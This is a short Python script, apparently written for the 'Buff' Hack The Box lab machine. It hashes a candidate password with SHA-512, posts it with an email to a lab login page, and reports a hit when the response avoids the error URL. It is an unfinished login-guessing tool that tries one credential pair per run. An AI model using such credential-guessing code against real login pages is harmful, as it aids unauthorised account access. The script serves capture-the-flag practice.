# -*- coding: utf-8 -*-
#!/usr/bin/python

########################################################
## Author: NikNitro!                                  ##
## Date:   07/08/2020                                 ##
##                                                    ##
## For using with the "Buff" box in HTB               ##
## Note: I've found another way fot hack this         ##
########################################################

def create_payload(email, password):
  import hashlib
  from urllib import parse

  hashed_password = hashlib.sha512(password.encode('utf-8'))
  #payload = "email={email}&password=&p={encoded_password}".format(email=email, encoded_password=hashed_password.hexdigest())
  payload = parse.urlencode({'email': email, 'password': '', 'p':hashed_password.hexdigest()}).encode()

  print(password + " with the payload is: " + str(payload))
  return payload


def send_request(address, payload):
  from urllib import request
  req =  request.Request(address, data=payload) # this will make the method "POST"
  resp = request.urlopen(req)
  print(resp.url)
  if(resp.url != "http://10.10.10.198:8080/index.php?error=1"):
    print("ENCONTRADO PAYLOAD: " + str(payload))
  

# Here must be a function for the loop against the two list: users and passwords

# Here must be a function for translate a dictionary into a list.

def main():
  import sys
  print("Reading args")
  if len(sys.argv) != 4:
    print("ERROR! The args must be 3: Address, userList and passwordList (all in clear).")
    return 0
  print(sys.argv)
  address = sys.argv[1]
  userList = sys.argv[2]
  passwordList = sys.argv[3]
  print("Starting execution")
  payload = create_payload(userList, passwordList)
  send_request(address, payload)

if __name__ == "__main__":
    main()